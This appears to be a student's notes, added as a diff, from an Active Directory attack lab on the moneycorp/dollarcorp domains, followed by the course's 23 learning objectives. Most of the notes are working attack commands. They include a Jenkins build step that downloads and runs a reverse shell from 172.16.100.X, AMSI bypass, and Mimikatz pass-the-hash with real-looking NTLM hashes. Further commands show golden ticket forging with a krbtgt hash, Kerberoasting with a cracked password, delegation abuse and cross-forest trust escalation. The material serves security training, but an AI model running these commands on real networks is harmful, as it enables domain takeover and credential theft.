@@ -1,0 +1,273 @@
+PS C:\AD\Tools> . .\PowerUp.ps1 PS 
+C:\AD\Tools> Get-ServiceUnquoted 
+PS C:\AD\Tools> Get-ModifiableServiceFile -Verbose 
+PS C:\AD\Tools> Get-ModifiableService 
+PS C:\AD\Tools> Invoke-ServiceAbuse -Name 'AbyssWebServer' -UserName 'dcorp\studentx' 
+sid , sids
+Machines
+dcorp-adminsrv.dollarcorp.moneycorp.locaL
+get-netcomputer, pre:- admin in local, Find-LocalAdminAccess, enter ps session
+--
+mimikatz
+
+derviative local admin rights click
+----
+dcorp-ci.dollarcorp.moneycorp.local
+get-net computer , port 8080
+configure builds
+powershell.exe iex (iwr http://172.16.100.X/Invoke-PowerShellTcp.ps1 UseBasicParsing);Invoke-PowerShellTcp -Reverse -IPAddress 172.16.100.X -Port 443 
+
+--------
+**dcorp-mgmt.dollarcorp.moneycorp.local
+After PS C:\Program Files (x86)\Jenkins\workspace\Projectx> whoami dcorp\ciadmin
+Now load AMSI bypass script, then load powerview and user hunter
+PS C:\Program Files (x86)\Jenkins\workspace\Projectx> iex (iwr http://172.16.100.x/PowerView.ps1 -UseBasicParsing) PS C:\Program Files (x86)\Jenkins\workspace\Projectx> Invoke-UserHunter
+PS C:\Program Files (x86)\Jenkins\workspace\Projectx> Invoke-Command ScriptBlock {whoami;hostname} -ComputerName dcorp-mgmt.dollarcorp.moneycorp.local 
+we get command execution and also hash of a logged in domain admin named svcadmmin
+PS C:\Program Files (x86)\Jenkins\workspace\Projectx> iex (iwr http://172.16.100.X/Invoke-Mimikatz.ps1 -UseBasicParsing) 
+-------
+dcorp-adminsrv.moneycorp.local
+
+Now using svcadmin hash OPTH PS C:\AD\Tools> Invoke-Mimikatz -Command '"sekurlsa::pth /user:svcadmin /domain:dollarcorp.moneycorp.local /ntlm:b38ff50264b74508085d82c69794a4d8 /run:powershell.exe"' 
+PS C:\Windows\system32> Enter-PSSession dcorpadminsrv.dollarcorp.moneycorp.local 
+[dcorp-adminsrv.dollarcorp.moneycorp.local]: PS C:\Users\svcadmin\Documents> hostname 
+dcorp-adminsrv
+if we try to run mimikatz in dcorp-adminsrv , we get error about language mode, get apploacker policy , we can run from programfiles, so drop mimikatz there,
+we cannot do dot net sourcing, so we need to include the function call at the end of the script
+PS C:\AD\Tools> Copy-Item .\Invoke-MimikatzEx.ps1 \\dcorp-adminsrv.dollarcorp.moneycorp.local\c$\'Program Files'
+Now after getting srvdmin hash
+PS C:\AD\Tools> Invoke-Mimikatz -Command '"sekurlsa::pth /user:srvadmin /domain:dollarcorp.moneycorp.local /ntlm:a98e18228819e8eec3dfa33cb68b0728 /run:powershell.exe"'
+A new window prompts with srvadmin privileges. Let’s use powerview to check if srvadmin has local administrator privileges on any other machine in the domain where a domain admin session is available. 
+PS C:\AD\Tools> powershell -ep bypass Windows PowerShell Copyright (C) 2016 Microsoft Corporation. All rights reserved. 
+  PS C:\AD\Tools> . .\PowerView.ps1 PS C:\AD\Tools> Invoke-UserHunter -CheckAccess 
+it shows srvadmin has admin access in dcorp-mgmt and svcadmin has session.
+now get session on dcorp-mgmt PS C:\AD\Tools> Enter-PSSession -ComputerName dcorp-mgmt.dollarcorp.moneycorp.local  
+ whoami 
+dcorp\srvadmin
+again dump hash of domain admin svcadmin and can get powershell
+
+------
+dcorp-dc.dollarcorp.moneycorp.local- session of domain admin,(persistance:- golden,silver,skeleton,dcsync,modify security discriptor)
+(privesc-kerberoasting, pre auth kerbroast disabled, modify pre auth kerbroast. unconstrained delegation,
+now from powershell of svcadmin do ps remoting on dcorp-dc
+PS C:\AD\Tools> $sess = New-PSSession -ComputerName dcorp-dc 
+PS C:\AD\Tools> Enter-PSSession $sess 
+AMSI bypass script, exit, now from PS cmd
+PS C:\AD\Tools> Invoke-Command -FilePath .\Invoke-Mimikatz.ps1 -Session $sess PS C:\AD\Tools> Enter-PSSession $sess [dcorp-dc]:
+(persistence) 
+PS C:\Users\svcadmin\Documents> Invoke-Mimikatz -Command '"lsadump::lsa /patch"' 
+get hash of krbgt account and create a golden ticket with hash. 
+PS C:\AD\Tools> Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"' 
+after golden ticket created
+
+ PS C:\AD\Tools> ls \\dcorp-dc.dollarcorp.moneycorp.local\c$ 
+we can use rc4 hash for silver ticket, 
+(persistence) 
+(priv esc to domain admin)
+-----
+kerberoast
+PS C:\AD\Tools> . .\PowerView.ps1 
+PS C:\AD\Tools> Get-NetUser -SPN 
+ The svcadmin, which is a domain administrator has a SPN set! Let’s request a ticket for the service: 
+PS C:\AD\Tools> Add-Type -AssemblyNAme System.IdentityModel 
+PS C:\AD\Tools> New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local" 
+PS C:\AD\Tools> klist 
+Now, let’s dump the tickets to disk: using mimikatz
+PS C:\AD\Tools> . .\Invoke-Mimikatz.ps1 
+PS C:\AD\Tools> Invoke-Mimikatz -Command '"kerberos::list /export"'
+Now, copy the the MSSQL ticket to the Kerberoast folder and offline crack the Service Account Password: 
+PS C:\AD\Tools> Copy-Item .\1-40a10000-studentx@MSSQLSvc~dcorpmgmt.dollarcorp.moneycorp.local-DOLLARCORP.MONEYCORP.LOCAL.kirbi C:\AD\Tools\kerberoast\ 
+PS C:\AD\Tools> cd kerberoast PS C:\AD\Tools\kerberoast> python.exe .\tgsrepcrack.py .\10k-worst-pass.txt .\1-40a10000-studentx@MSSQLSvc~dcorp-mgmt.dollarcorp.moneycorp.localDOLLARCORP.MONEYCORP.LOCAL.kirbi 
+found password for ticket 0: *ThisisBlasphemyThisisMadness!! 
+so this is svcadmin password.
+---
+users with Kerberos Preauth disabled.. powerviewdev.ps1 and with we can use Get-ASREPHash from ASREPRoast get hash and crack using john..
+--- 
+Determine if studentx has permissions to set UserAccountControl flags for any user. 
+Now, let’s enumerate those users where studentx has GenericWrite or GenericAll rights. 
+Since studentx is a part of the RDPUsers group. make it kerberoast preauth disabled , then use powerviewdev,we can use Get-ASREPHash from ASREPRoast
+----
+UserAccountControl flags for any user -this one for SPN setting
+use the powerviewdev, view 
+PS C:\AD\Tools> . .\PowerView_dev.ps1
+ PS C:\AD\Tools> Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentityReferenceName -match "RDPUsers"} 
+PS C:\AD\Tools> Get-DomainUser -Identity support107user | select serviceprincipalname   
+serviceprincipalname --------------------   
+Since studentX has GenericAll rights on the supportXuser, let’s force set a SPN on it:  
+ PS C:\AD\Tools> New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "dcorp/whateverX" 
+PS C:\AD\Tools> klist 
+PS C:\AD\Tools\kerberoast> Invoke-Mimikatz -Command '"kerberos::list /export"' 
+PS C:\AD\Tools\kerberoast> python.exe .\tgsrepcrack.py .\10k-worst-pass.txt .\2-40a10000-studentx@dcorp/whateverX-DOLLARCORP.MONEYCORP.LOCAL.kirbi  
+
+
+-------------------------------------
+dcorp-appsrv.dollarcorp.moneycorp.local
+powerview to get unconstarined delegation
+we have it enabled in dcorp-appsrv, appadmin hash to login with mimikatz and use find-localadminaccess
+ps remoting into it., disable amsi, exit, load mimikatz, enter ps session, export ticket to disk,
+use the ticket, inject the tickt using mimikatz, get command execution in dc.
+
+--------------------------------------------------
+dcorp-mssql.dollarcorp.moneycorp.LOCAL 19 20
+To enumerate users with constrained delegation we can use PowerView dev: 
+PS C:\AD\Tools> . .\PowerView_dev.ps1 
+PS C:\AD\Tools> Get-DomainUser -TrustedToAuth 
+samaccountname           : websvc
+msds-allowedtodelegateto : {CIFS/dcorp-mssql.dollarcorp.moneycorp.LOCAL, CIFS/dcorp-mssql}
+use the hash which we got before and use kekeo with tgt:ask module
+kekeo # tgt::ask /user:websvc /domain:dollarcorp.moneycorp.local /rc4:cc098f204c5887eaa8253e7c2749156f 
+request tgs from got tgt
+ tgs::s4u /tgt:TGT_websvc@DOLLARCORP.MONEYCORP.LOCAL_krbtgt~dollarcorp.moneycorp.local@ DOLLARCORP.MONEYCORP.LOCAL.kirbi /user:Administrator@dollarcorp.moneycorp.local /service:cifs/dcorpmssql.dollarcorp.moneycorp.LOCAL 
+Next, inject the ticket in current session to use it using mimikatz
+PS C:\AD\Tools\kekeo\x64> Invoke-Mimikatz -Command '"kerberos::ptt TGS_Administrator@dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL_cifs~ dcorp-mssql.dollarcorp.moneycorp.LOCAL@DOLLARCORP.MONEYCORP.LOCAL.kirbi"' 
+PS C:\AD\Tools\kekeo\x64> ls \\dcorp-mssql.dollarcorp.moneycorp.local\c$ 
+-----
+mcorp-dc.moneycorp.local 21 22 (domain trust key , krbtgt hash)
+Domain trust key
+DA needs to be there with hash of SVC admin. 
+extract trust key with mimikatz, 
+disable amsi,exit, load mimikatz into session
+mimikatz command extract trust key like shown below
+rc4_hmac_nt of dollarcorp.moneycorp.local to moneycorp.local.
+from local powershell force interm tgt iwth mimikatz .kirbi in kekeo old
+request using asktgs.exe with the CIFS/mcorp-dc.moneycorp.local
+then inject to lsass of our machine with kirbikator.exe
+now ls in \\mcorp-dc.moneycorp.local
+--
+We already have the krbtgt hash of dollarcorp. Let's create the inter-realm TGT using mimi: 
+PS C:\AD\Tools> Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-211874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234700767426-519 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /ticket:C:\AD\Tools\krbtgt_tkt.kirbi"' 
+Next, inject the ticket using mimikatz:  
+PS C:\AD\Tools> Invoke-Mimikatz -Command '"kerberos::ptt C:\AD\Tools\krbtgt_tkt.kirbi"' 
+PS C:\AD\Tools> gwmi -class win32_operatingsystem -ComputerName mcorp-dc.moneycorp.local 
+set scheduled tasks, get reverse shell by hosting in hfs, dump EA hash using mimikatz
+
+
+eurocorp-dc.eurocorp.local (trust key,
+
+access shared resources of eurocorp-dc.eurocorp.local by 
+same as before did from dollarcorp.moneycorp.local to moneycorp.local here
+we see for dollarcorp.monaycorp.local trust key to eurocorp.local
+once trust key, force interm tgt with mimikatz .kirbi in kekeo old,
+asktgs with cifs/eurocorp-dc.eurocorp.local
+do ls eurocorp-dc.eurocorp.local/shared/
+---
+eu-sql.eurocorp.local
+powerupSQL-master
+import powerupsql.psd1
+check if we have read instance in any mssql server
+get sqlserver links for the read instance dcorp-mssql.dollarcorp.moneycorp.local
+crawl the links with get-sqlserverlinkcrawl
+we can see  we have sa privilage in eu-sql.eu.moneycorp.local
+we can send whoami in eu-sql, we can also get reverse shell
+
+------
+
+
+
+Learning Objective 1
+• Enumerate following for the dollarcorp domain:
+ – Users 
+– Computers
+ – Domain Administrators
+ – Enterprise Administrators
+ – Shares 
+
+Learning Objective 2
+• Enumerate following for the dollarcorp domain: 
+– List all the OUs
+ – List all the computers in the StudentMachines OU. 
+– List the GPOs 
+– Enumerate GPO applied on the StudentMachines OU.
+
+
+Learning Objective 3
+• Enumerate following for the dollarcorp domain: 
+– ACL for the Users group 
+– ACL for the Domain Admins group
+ – All modify rights/permissions for the studentx
+
+Learning Objective 4
+• Enumerate all domains in the moneycorp.local forest. 
+• Map the trusts of the dollarcorp.moneycorp.local domain. 
+• Map External trusts in moneycorp.local forest. 
+• Identify external trusts of dollarcorp domain. Can you enumerate trusts for a trusting forest?
+
+Learning Objective 5
+• Exploit a service on dcorp-studentx and elevate privileges to local administrator. 
+• Identify a machine in the domain where studentx has local administrative access. 
+• Using privileges of a user on Jenkins on 172.16.3.11:8080, get admin privileges on 172.16.3.11 - the dcorp-ci server.
+
+Learning Objective 6
+Setup BloodHound and identify a machine where studentx has local administrative access. 
+
+Learning Objective 7
+Domain user on one of the machines has access to a server where a domain admin is logged in. 
+Identify: – The domain user – The server where the domain admin is logged in.
+ • Escalate privileges to Domain Admin – Using the method above. – Using derivative local admin
+
+
+Learning Objective 8
+• Dump hashes on the domain controller of dollarcorp.moneycorp.local. 
+• Using the NTLM hash of krbtgt account, create a Golden ticket. 
+• Use the Golden ticket to (once again) get domain admin privileges from a machine.
+
+
+Learning Objective 9
+• Try to get command execution on the domain controller by creating silver ticket for:
+ – HOST service
+ – WMI
+
+Learning Objective 10
+• Use Domain Admin privileges obtained earlier to execute the Skeleton Key attack
+
+Learning Objective 11
+Use Domain Admin privileges obtained earlier to abuse the DSRM credential for persistence.
+
+Learning Objective 12
+• Check if studentx has Replication (DCSync) rights. 
+• If yes, execute the DCSync attack to pull hashes of the krbtgt user. 
+• If no, add the replication rights for the studentx and execute the DCSync attack to pull hashes of the krbtgt user.
+
+Learning Objective 13
+• Modify security descriptors on dcorp-dc to get access using PowerShell remoting and WMI without requiring administrator access.
+• Retrieve machine account hash from dcorp-dc without using administrator access and use that to execute a Silver Ticket attack to get code execution with WMI.
+
+Learning Objective 14
+• Using the Kerberoast attack, crack password of a SQL server service account.
+
+Learning Objective 15
+• Enumerate users that have Kerberos Preauth disabled. 
+• Obtain the encrypted part of AS-REP for such an account.
+• Determine if studentx has permissions to set UserAccountControl flags for any user. 
+• If yes, disable Kerberos Preauth on such a user and obtain encrypted part of AS-REP.
+
+Learning Objective 16
+• Determine if studentx has permissions to set UserAccountControl flags for any user. 
+• If yes, force set a SPN on the user and obtain a TGS for the user.
+
+
+Learning Objective 17
+• Find a server in dcorp domain where Unconstrained Delegation is enabled.
+• Access that server, wait for a Domain Admin to connect to that server and get Domain Admin privileges.
+
+Learning Objective 18
+• Enumerate users in the domain for whom Constrained Delegation is enabled. – For such a user, request a TGT from the DC and obtain a TGS for the service to which delegation is configured. – Pass the ticket and access the service as DA.
+ • Enumerate computer accounts in the domain for which Constrained Delegation is enabled. – For such a user, request a TGT from the DC. – Use the TGS for executing the DCSync attack. 
+
+Learning Objective 19
+• Using DA access to dollarcorp.moneycorp.local, escalate privileges to Enterprise Admin or DA to the parent domain, moneycorp.local using the domain trust key. 
+
+Learning Objective 20
+• Using DA access to dollarcorp.moneycorp.local, escalate privileges to Enterprise Admin or DA to the parent domain, moneycorp.local using dollarcorp's krbtgt hash.
+
+Learning Objective 21
+ With DA privileges on dollarcorp.moneycorp.local, get access to SharedwithDCorp share on the DC of eurocorp.local forest.
+
+Learning Objective 22
+• Get a reverse shell on a SQL server in eurocorp forest by abusing database links from dcorp-mssql.
+
+Learning Objective 23
+• Use DCShadow to set a SPN for rootxuser. 
+• Using DCShadow, set rootxuser's SIDHistory without using DA.
+• Modify the permissions of AdminSDHolder container using DCShadow and add Full Control permission for studentx.
+---------------------------
